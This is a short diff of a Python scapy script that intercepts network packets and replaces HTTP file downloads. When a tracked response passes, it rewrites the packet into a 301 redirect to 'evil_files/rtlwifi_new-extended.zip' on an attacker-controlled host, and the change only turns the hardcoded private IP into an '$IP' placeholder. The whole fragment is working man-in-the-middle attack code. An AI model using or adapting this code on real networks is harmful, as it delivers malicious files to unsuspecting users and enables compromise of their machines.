@@ -25,7 +25,7 @@ def process_packet(packet):
             if scapy_packet[scapy.TCP].seq in ack_list:
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
                 print("[+] Replacing File....")
-                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.43.198/evil_files/rtlwifi_new-extended.zip\n\n")
+                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://$IP/evil_files/rtlwifi_new-extended.zip\n\n")
 
                 # print(scapy_packet.show())
                 packet.set_payload(str(scapy_packet))
